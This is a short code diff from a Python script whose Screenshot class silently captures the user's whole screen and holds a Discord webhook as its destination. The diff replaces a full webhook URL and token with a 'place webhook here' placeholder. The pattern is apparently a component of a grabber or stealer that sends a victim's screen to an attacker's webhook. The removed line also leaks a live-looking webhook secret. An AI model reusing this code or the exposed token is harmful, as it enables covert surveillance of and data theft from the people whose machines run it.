@@ -4,7 +4,7 @@ import requests
 from PIL import ImageGrab
 
 class Screenshot():
-        webhook = 'https://discord.com/api/webhooks/1135745003604430878/MTjCGvBPLpLeWeLTfeZg4RNzl2jP4pToaLtrZ1CnvFl4y4Ai6dojaYnCejzkCPdFmBjM' # place webhook here
+        webhook = 'WEBHOOKHERE' # place webhook here
 
         screenshot = ImageGrab.grab()
         screenshot_filename = "screenshot.png"
